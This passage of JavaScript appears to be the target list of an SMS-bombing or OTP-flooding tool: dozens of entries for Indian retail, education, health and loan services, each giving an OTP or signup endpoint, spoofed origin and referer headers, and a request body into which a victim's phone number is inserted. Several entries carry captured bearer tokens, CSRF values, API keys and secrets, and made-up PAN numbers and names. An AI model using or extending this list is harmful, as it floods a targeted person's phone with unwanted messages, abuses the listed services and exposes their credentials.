        data: (phone) => JSON.stringify({ mobile: phone, source: "zerodha", partner_id: "" })
    },
    {
        name: "Aakash_Anthe",
        url: "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.aakash.ac.in",
            "referer": "https://www.aakash.ac.in/",
            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"
        },
        data: (phone) => JSON.stringify({ mobile_psid: phone, mobile_number: "", activity_type: "aakash-myadmission", webengageData: { profile: "student", whatsapp_opt_in: true, method: "mobile" } })
    },
    {
        name: "Medibuddy",
        url: "https://loginprod.medibuddy.in/unified-login/user/register",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://www.medibuddy.in",
            "referer": "https://www.medibuddy.in/"
        },
        data: (phone) => JSON.stringify({ source: "medibuddyInWeb", platform: "medibuddy", phonenumber: phone, flow: "Retail-Login-Home-Flow", idealLoginFlow: false, advertiserId: "3893d117-b321-Lba9-815e-db63c64b112a", mbUserId: null })
    },
    {
        name: "Wrogn",
        url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "action": "sendOTP",
            "content-type": "application/json",
            "origin": "https://wrogn.com",
            "referer": "https://wrogn.com/",
            "shop_name": "wrogn-website.myshopify.com"
        },
        data: (phone) => JSON.stringify({ username: "+91" + phone, type: "mobile", domain: "wrogn.com", recaptcha_token: "" })
    },
    {
        name: "Medkart",
        url: "https://app.medkart.in/api/v1/auth/requestOTP?uuid=f9e75a95-e172-4922-b69c-08e1e3be9f1b",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "app-platform": "web",
            "authorization": "Bearer",
            "content-type": "application/json",
            "device_id": "6641194520998",
            "langcode": "en",
            "origin": "https://www.medkart.in",
            "referer": "https://www.medkart.in/"
        },
        data: (phone) => JSON.stringify({ mobile_no: phone })
    },
    {
        name: "Mamaearth",
        url: "https://auth.mamaearth.in/v1/auth/initiate-signup",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json;charset=UTF-8",
            "isweb": "true",
            "origin": "https://mamaearth.in",
            "referer": "https://mamaearth.in/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, referralCode: "" })
    },
    {
        name: "LoveLocal",
        url: "https://homedeliverybackend.mpaani.com/auth/send-otp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en",
            "client-code": "vulpix",
            "content-type": "application/json",
            "origin": "https://www.lovelocal.in",
            "referer": "https://www.lovelocal.in/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, role: "CUSTOMER" })
    },
    {
        name: "Tyreplex",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        method: "POST",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Moglix",
        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://www.moglix.com",
            "referer": "https://www.moglix.com/"
        },
        data: (phone) => JSON.stringify({ email: "", phone: phone, type: "p", source: "signup", buildVersion: "DESKTOP-7.3", device: "desktop" })
    },
    {
        name: "Upgrad",
        url: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "client": "web",
            "content-type": "application/json",
            "course": "general-interest",
            "origin": "https://www.upgrad.com",
            "referer": "https://www.upgrad.com/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: "+91" + phone })
    },
    {
        name: "Udaan",
        url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "origin": "https://auth.udaan.com",
            "referer": "https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2",
            "x-app-id": "udaan-auth"
        },
        data: { "_raw": "mobile={phone}" }
    },
    {
        name: "Xylem",
        url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        method: "POST",
        headers: {
            "client-version": "300",
            "Authorization": "Bearer",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.xylem.live/",
            "randomId": "bfc4e54e-1873-48cc-823e-40d401d9dbb4",
            "client-id": "64254d66be2a390018e6d348",
            "client-type": "WEB"
        },
        data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91", firstName: "Anant Ambani" })
    },
    {
        name: "NoBroker_OTP",
        url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/"
        },
        data: { "_raw": "phone=%2B91{phone}" }
    },
    {
        name: "Vidyakul_New",
        url: "https://vidyakul.com/signup-otp/send",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://vidyakul.com",
            "referer": "https://vidyakul.com/class-12th/test-series",
            "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx",
            "x-requested-with": "XMLHttpRequest"
        },
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "Vedantu_New",
        url: "https://user.vedantu.com/user/preLoginVerification",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.vedantu.com",
            "referer": "https://www.vedantu.com/register"
        },
        data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false })
    },
    {
        name: "Unacademy_New",
        url: "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://unacademy.com",
            "referer": "https://unacademy.com/login?redirectTo=%2Fsettings",
            "x-platform": "0"
        },
        data: (phone) => JSON.stringify({ phone: phone, country_code: "IN", otp_type: 1, email: "", send_otp: true, is_un_teach_user: false })
    },
    {
        name: "Flipkart_New",
        url: "https://2.rome.api.flipkart.com/api/7/user/otp/generate",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.flipkart.com",
            "referer": "https://www.flipkart.com/",
            "x-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 FKUA/website/42/website/Desktop"
        },
        data: (phone) => JSON.stringify({ loginId: "+91" + phone })
    },
    {
        name: "HDFC_Ergo",
        url: "https://here.co.in/users/v1/customer-portal/send-otp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "origin": "https://www.hdfcergo.com",
            "referer": "https://www.hdfcergo.com/",
            "x-api-client": "Website",
            "x-app-version-code": "182",
            "x-origin": "https://sh.hdfcergo.com"
        },
        data: (phone) => JSON.stringify({ mobile: phone, source: "sms" })
    },
    {
        name: "AstroYogi",
        url: "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzcyOTg5NjQ0LCJleHAiOjE3ODA3NjU2NDR9.",
            "content-type": "application/json",
            "origin": "https://www.astroyogi.com",
            "referer": "https://www.astroyogi.com/registration/login.aspx"
        },
        data: (phone) => JSON.stringify({ PhoneNumber: phone, PhoneCode: "91", Domain: "Web", CountryId: "IN", IpAddress: "47.9.35.166", CountryCodeByHeader: "IN" })
    },
    {
        name: "Testbook",
        url: "https://api.testbook.com/api/v2/mobile/signup?mobile={phone}&clientId=1063568644.1772990508&sessionId=1772990507",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://testbook.com",
            "referer": "https://testbook.com/",
            "x-tb-client": "web,1.2"
        },
        data: (phone) => JSON.stringify({ firstVisitSource: { type: "organic", utm_source: "google", utm_medium: "organic", timestamp: "2026-03-08T17:21:46.000Z", entrance: "https://testbook.com/login", referralUrl: "https://www.google.com/" }, mobile: phone, signupDetails: { page: "HomePage", pagePath: "/", pageType: "HomePage" }, signupSource: { type: "organic", utm_source: "google", utm_medium: "organic", timestamp: "2026-03-08T17:25:36.000Z", entrance: "https://testbook.com/login", referralUrl: "https://www.google.com/" } })
    },
    {
        name: "Naaptol",
        url: "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.naaptol.com",
            "pagesecuritytoken": "DE3NzMzMTY2NTY3NTZfVkBAcHRvbF83MzA1ODUyba",
            "referer": "https://www.naaptol.com/",
            "x-requested-with": "XMLHttpRequest"
        },
        data: (phone) => JSON.stringify({ actionname: "checkMobileUserExistsForTvApp", mobile: phone })
    },
    {
        name: "IndiaMart",
        url: "https://m.indiamart.com/ajaxrequest/identified/common/login",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://m.indiamart.com",
            "referer": "https://m.indiamart.com/login/"
        },
        data: (phone) => JSON.stringify({ GEOIP_COUNTRY_ISO: "IN", IP: "47.9.35.50", IPADDRESS: "47.9.35.50", IP_COUNTRY: "India", ciso: "IN", duplicateEmailCheck: "", glid: "", glusr_usr_ip: "47.9.35.50", originalreferer: "https://m.indiamart.com/login/", pass: "", ph_code: "91", use: phone })
    },
    {
        name: "RelianceRetail",
        url: "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
        method: "POST",
        headers: {
            "accept": "application/json",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI1LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzczMzE3Nzg4LCJzYWx0IjowfQ.DLFEXcyozGInRiLn3U2dTGQEwTog6UYc3WP62ujmJGY",
            "content-type": "application/json",
            "origin": "https://account.relianceretail.com",
            "referer": "https://account.relianceretail.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Apna",
        url: "https://production.apna.co/api/userprofile/v1/otp/",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://employer.apna.co",
            "referer": "https://employer.apna.co/"
        },
        data: (phone) => JSON.stringify({ phone_number: "91" + phone, retries: 0, hash_type: "employer", source: "employer" })
    },
    {
        name: "PaisaOnSalary",
        url: "https://cms.paisaonsalary.in/api/Api/Website/InstantJourneyController/appCustomerRegisteration",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "origin": "https://www.paisaonsalary.com",
            "referer": "https://www.paisaonsalary.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, event_name: "login", utm_source: "", utm_medium: "", utm_campaign: "", utm_term: "", utm_content: "" })
    },
    {
        name: "PaisaBoxx",
        url: "https://api.paisaboxx.com/identity/UserAuth/loginWithMobile?country_code=91&mobile={phone}&partner_id=6350faa323&source=hexa&campaign=delhi_5499",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "origin": "https://www.paisaboxx.com",
            "referer": "https://www.paisaboxx.com/"
        }
    },
    {
        name: "LoanZap",
        url: "https://webapi.loanzap.in/v2/apply-loan/register-user",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "origin": "https://www.loanzap.in",
            "referer": "https://www.loanzap.in/"
        },
        data: (phone) => JSON.stringify({ name: "Binod", mobile: phone, email: "test@gmail.com", terms: "1", utm_source: "", utm_campaign: "" })
    },
    {
        name: "CashKredit",
        url: "https://api.cashkredit.in/v2/apply-loan/register-user",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "origin": "https://www.cashkredit.in",
            "referer": "https://www.cashkredit.in/"
        },
        data: (phone) => JSON.stringify({ pan: "RHGSW1854B", name: "Binod", mobile: phone, email: "test@gmail.com", terms: "1", utm_source: "", utm_campaign: "" })
    },
    {
        name: "RupeeLending",
        url: "https://rupeelending.com/apply-now/send-otp",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "origin": "https://rupeelending.com",
            "referer": "https://rupeelending.com/apply-now"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Figii",
        url: "https://consumer.figii.in/api/auth/login/?mobile={phone}&partnerId=&productType=&clientToken=&programId=&sourceBy=&sourceType=",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "origin": "https://consumer.figii.in",
            "referer": "https://consumer.figii.in/login/"
        },
        data: (phone) => JSON.stringify({ username: phone, medium: "SMS", meta: {} })
    },
    {
        name: "BrightLoans",
        url: "https://brightloans.in/login-sbm",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://brightloans.in",
            "referer": "https://brightloans.in/apply-now"
        },
        data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2&device_id=abc123" }
    },
    {
        name: "SalaryTopUp",
        url: "https://salarytopup.in/api/Api/Website/InstantJourneyController/appCustomerRegisteration",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Auth": "MjQ4ZmY5MGM0MmM2N2EyOTJlZWE0MTBiNGU2Y2Q2NzU=",
            "origin": "https://salarytopup.com",
            "referer": "https://salarytopup.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, event_name: "login", utm_source: "", utm_medium: "", utm_campaign: "", utm_term: "", utm_content: "" })
    },
    {
        name: "TezCredit",
        url: "https://api.tezcredit.com/identity/UserAuth/loginWithMobile?country_code=91&mobile={phone}",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "content-length": "0",
            "origin": "https://www.tezcredit.com",
            "referer": "https://www.tezcredit.com/"
        }
    },
    {
        name: "Swiggy",
        url: "https://www.swiggy.com/mapi/auth/sms-otp",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "origin": "https://www.swiggy.com",
            "referer": "https://www.swiggy.com/auth",
            "x-requested-with": "via.bolte"
        },
        data: (phone) => JSON.stringify({ mobile: phone, _csrf: "wYqwp6Boyjtu-la46bXHvrfnJrrsKmi4MmM3RTGk" })
    },
    {
        name: "TataCapital_HL",
        url: "https://hlonline.tatacapital.com/APILayer/dlp/otp/services/generateOtp",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "origin": "https://www.tatacapital.com",
            "referer": "https://www.tatacapital.com/"
        },
        data: (phone) => JSON.stringify({ mobileNumber: phone, isNew: 1, deviceOs: "web", sourceName: "Website", webOsCapture: "Linux aarch64", deviceCapture: "Web-Android" })
    },
    {
        name: "TataCapital_PL",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "origin": "https://www.tatacapital.com",
            "referer": "https://www.tatacapital.com/"
        },
        data: (phone) => JSON.stringify({ mobileNumber: phone, deviceOS: "Web", applSource: "PL", deviceType: "Web", deviceSubType: "" })
    },
    {
        name: "TataCapital_LAP",
        url: "https://onlinelaploans.tatacapital.com/APILayer/dlp/otp/services/generateOtp",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "origin": "https://www.tatacapital.com",
            "referer": "https://www.tatacapital.com/"
        },
        data: (phone) => JSON.stringify({ mobileNumber: phone, isNew: 1, deviceOs: "web", sourceName: null, subSourceName: null, webOsCapture: "Linux aarch64", deviceCapture: "Web-Android" })
    },
    {
        name: "Univest",
        url: "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        method: "GET",
        headers: {
            "Accept": "application/json",
            "origin": "https://univest.in",
            "referer": "https://univest.in/"
        }
    },
    {
        name: "HeroFinCorp_Festive",
        url: "https://festive.api.herofincorp.com/v1/customer/otp/{phone}",
        method: "GET",
        headers: {
            "Accept": "application/json",
            "origin": "https://festive.herofincorp.com",
            "referer": "https://festive.herofincorp.com/"
        }
    },
    {
        name: "MuscleBlaze",
        url: "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9",
        method: "GET",
        headers: {
            "Accept": "application/json",
            "origin": "https://www.muscleblaze.com",
            "referer": "https://www.muscleblaze.com/"
        }
    },
    {
        name: "INRFlash",
        url: "https://offers.inrflash.com/campinr/index.php",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://offers.inrflash.com",
            "referer": "https://offers.inrflash.com/campinr/index.php"
        },
        data: { "_raw": "action=send_otp&phoneNo={phone}" }
    },
    {
        name: "CRMSL",
        url: "https://api.crmsl.com/Api/Website/InstantJourneyController/appCustomerRegisteration",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Auth": "ZTI4MTU1MzE4NWQ2MGQyZTFhNWM0NGU3M2UzMmM3MDM=",
            "origin": "https://suryaloan.com",
            "referer": "https://suryaloan.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, event_name: "login", utm_source: "Value_Leaf", utm_medium: "GoogleBsub_id1", utm_campaign: "pmax_1", utm_term: "836_01", utm_content: "" })
    },
    {
        name: "Factori",
        url: "https://factori.com/login/check_user_exists",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://factori.com",
            "referer": "https://factori.com/my-account"
        },
        data: { "_raw": "mobNumber={phone}&countryCode=91" }
    },
    {
        name: "Havells",
        url: "https://havells.com/otplogin/account/otploginpost/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://havells.com",
            "referer": "https://havells.com/customer/account/login/"
        },
        data: { "_raw": "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on" }
    },
    {
        name: "Zepto",
        url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": "https://www.zepto.com",
            "Referer": "https://www.zepto.com/"
        },
        data: (phone) => JSON.stringify({ mobileNumber: phone })
    },
    {
        name: "OneMG",
        url: "https://www.1mg.com/auth_api/v6/create_token",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": "https://www.1mg.com",
            "Referer": "https://www.1mg.com/"
        },
        data: (phone) => JSON.stringify({ number: phone })
    },
    {
        name: "ShipRocket",
        url: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": "https://www.shiprocket.in",
            "Referer": "https://www.shiprocket.in/"
        },
        data: (phone) => JSON.stringify({ mobileNumber: phone })
    },
    {
        name: "HeroFinCorp",
        url: "https://loans.apps.herofincorp.com/api/generateOtp",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "origin": "https://loans.apps.herofincorp.com",
            "referer": "https://loans.apps.herofincorp.com/en/personal-loan"
        },
        data: (phone) => JSON.stringify({ phone: phone, terms: true, whatsapp: true })
    },
    {
        name: "EntriApp",
        url: "https://entri.app/api/v3/users/check-phone/",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "user-language": "hi",
            "client": "web",
            "origin": "https://learn.entri.app",
            "referer": "https://learn.entri.app/"
        },
        data: (phone) => JSON.stringify({ phone: "+91" + phone, recaptcha_response: "dummy_token" })
    },
    {
        name: "DigiCredit",
        url: "https://customer-backend.digicredit.in/customers/customer-login",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "client-id": "7de19504-f422-42dc-bd51-5ed5dfb170c1",
            "origin": "https://applyloan.digicredit.in",
            "referer": "https://applyloan.digicredit.in/"
        },
        data: (phone) => JSON.stringify({ phoneNo: phone, journey_down: "true" })
    },
    {
        name: "Housing",
        url: "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home&isBot=false&platform=mobile&source=mobile&source_name=AudienceWeb",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "app-name": "mobile_web_buyer",
            "phoenix-api-name": "LOGIN_SEND_OTP_API",
            "origin": "https://housing.com",
            "referer": "https://housing.com/"
        },
        data: (phone) => JSON.stringify({ query: "mutation($phone:String){sendOtp(phone:$phone){success message}}", variables: { phone: phone } })
    },
    {
        name: "MyMoneyBazaar",
        url: "https://mm-app-backend.mymoneybazaar.com/api/v2/authentication/phone_no_verify/",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://web.mymoneybazaar.com",
            "referer": "https://web.mymoneybazaar.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },
    {
        name: "Shopsy",
        url: "https://www.shopsy.in/1.rome/api/1/action/view",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://www.shopsy.in",
            "referer": "https://www.shopsy.in/login"
        },
        data: (phone) => JSON.stringify({ actionRequestContext: { loginId: phone, loginType: "MOBILE", verificationType: "OTP", type: "LOGIN_IDENTITY_VERIFY" } })
    },
    {
        name: "KamakshiMoney",
        url: "https://loan-api.kamakshimoney.com/customers/customer-login-byMobile?utm_source=google_kamakshi_Pmax_Disbursal_web",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://loan.kamakshimoney.com",
            "Referer": "https://loan.kamakshimoney.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "PrimeCash",
        url: "https://api.primecash.app/api/v1/user",
        method: "POST",
        headers: {
            "Connection": "Keep-Alive",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json"
        },
        data: (phone) => JSON.stringify({ mobile: phone, isTNCVerified: true, hash: "O9BmoTki4+6" })
    },
    {
        name: "Allen",
        url: "https://api.allen-live.in/api/v1/auth/sendOtp?center_id=&source=home-page-login",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "x-device-id": "9aad014a-4181-4fe7-99e1-9ac721e538b4",
            "x-client-type": "mweb",
            "origin": "https://allen.in",
            "referer": "https://allen.in/"
        },
        data: (phone) => JSON.stringify({ country_code: "91", phone_number: phone, persona_type: "STUDENT", otp_type: "SHARED_DEFAULT" })
    },
    {
        name: "RupeeCare",
        url: "https://rc-backend.root.deployment.rupeecare.money/api/auth/get_otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "client-id": "d8247367-fabd-48c1-8314-ea00b431c232",
            "origin": "https://rupeecare.money",
            "referer": "https://rupeecare.money/"
        },
        data: (phone) => JSON.stringify({ phoneNo: phone, clientId: "d8247367-fabd-48c1-8314-ea00b431c232" })
    },
    {
        name: "JunoonCapital",
        url: "https://lmsapi.junooncapital.com/api/User/RegisterUser",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://apps.paisaudhar.com",
            "referer": "https://apps.paisaudhar.com/"
        },
        data: (phone) => JSON.stringify({ mobile_no: phone, device_info: "Mobile Chrome Android", company_id: "JUNOON", product_name: "PU" })
    },
    {
        name: "Rupyalelo",
        url: "https://apply.rupyalelo.com/api/login",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://apply.rupyalelo.com",
            "Referer": "https://apply.rupyalelo.com/auth"
        },
        data: (phone) => JSON.stringify({ mobile: phone, captchaKey: null })
    },
    {
        name: "RoopyaMoney",
        url: "https://api.roopya.money/api/v2/customer/lead",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "domain_name": "salarychampion",
            "apiSecret": "3acd32a5276b6b968028c2e7d6471051d5df9771d9049e2fc317b8e93113bdcc",
            "apiKey": "0025f469f0e293c539a207f2aaaa85c75f1c30191c31c44cc010c3b076ee1216",
            "Origin": "https://salarychampion.roopya.money",
            "Referer": "https://salarychampion.roopya.money/"
        },
        data: (phone) => JSON.stringify({ phone: phone, countryCode: "+91", ip: "152.58.58.64" })
    },
    {
        name: "Dhanrishi",
        url: "https://ub1.dhanrishi.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://dhanrishi.com",
            "referer": "https://dhanrishi.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "GEKDJ4648B", phone_number: phone })
    },
    {
        name: "SalaryOnTime",
        url: "https://journey.sotcrm.com/api/v1/journey-auth/send-otp/",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "origin": "https://salaryontime.com",
            "referer": "https://salaryontime.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, utmSource: "", utmMedium: "", utmCampaign: "", utmTerm: "", sourceId: 1 })
    },
    {
        name: "SpeedoLoan",
        url: "https://loanapply.speedoloan.com/api/login",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://loanapply.speedoloan.com",
            "Referer": "https://loanapply.speedoloan.com/auth"
        },
        data: (phone) => JSON.stringify({ mobile: phone, captchaKey: null })
    },
    {
        name: "FastSalary",
        url: "https://apilm.fastsalary.com/api/v2/auth/send-signup",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "domain": "app.fastsalary.com",
            "Origin": "https://app.fastsalary.com",
            "Referer": "https://app.fastsalary.com/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: "+91" + phone, email: "test@gmail.com", occupationTypeId: "7", monthlySalary: "546481", panCard: "GDODJ5434B", brandId: "676027d3-a43c-4716-9663-7272f5df1ac7", domain: "app.fastsalary.com" })
    },
    {
        name: "CredNidhi",
        url: "https://apilm.crednidhi.com/api/v2/auth/send-signup",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "domain": "app.crednidhi.com",
            "Origin": "https://app.crednidhi.com",
            "Referer": "https://app.crednidhi.com/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: "+91" + phone, email: "test@gmail.com", occupationTypeId: "7", monthlySalary: "50000", panCard: "HSOSN5464B", brandId: "5d8868eb-40e8-47f8-a497-cd2ce6216c4f", domain: "app.crednidhi.com" })
    },
    {
        name: "ClickMyLoan",
        url: "https://appb.clickmyloan.com/api/v2/authentication/phone_no_verify/",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://web.clickmyloan.com",
            "referer": "https://web.clickmyloan.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },
    {
        name: "GrowBizh",
        url: "https://growbizh.com/api/v1.0/generate-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://snapfunds.in",
            "Referer": "https://snapfunds.in/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, productType: "Personal Loan" })
    },
    {
        name: "SuryaLoan",
        url: "https://microservices.suryaloan.com/api/v1/customer-journey/login",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "Origin": "https://suryaloan.com",
            "Referer": "https://suryaloan.com/"
        },
        data: (phone) => JSON.stringify({ utmSource: "Value_Leaf", utmMedium: "GoogleBsub_id1", utmCampaign: "pmax_personal", utmTerm: "836_01", utm_content: "", mobile: phone, sourceId: 1 })
    },
    {
        name: "CreditSea",
        url: "https://backend.creditsea.com/api/v1/otp/generate-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "platform": "CREDITSEA",
            "origin": "https://www.creditsea.com",
            "referer": "https://www.creditsea.com/"
        },
        data: (phone) => JSON.stringify({ fName: null, lName: null, phoneNumber: phone, isWebUser: true })
    },
    {
        name: "SalarySetu",
        url: "https://backend.salarysetu.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://salarysetu.com",
            "Referer": "https://salarysetu.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "GSKSD5464Y", phone_number: phone })
    },
    {
        name: "ShreeLoan",
        url: "https://loanapply.shreeloan.com/api/login",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://loanapply.shreeloan.com",
            "Referer": "https://loanapply.shreeloan.com/auth"
        },
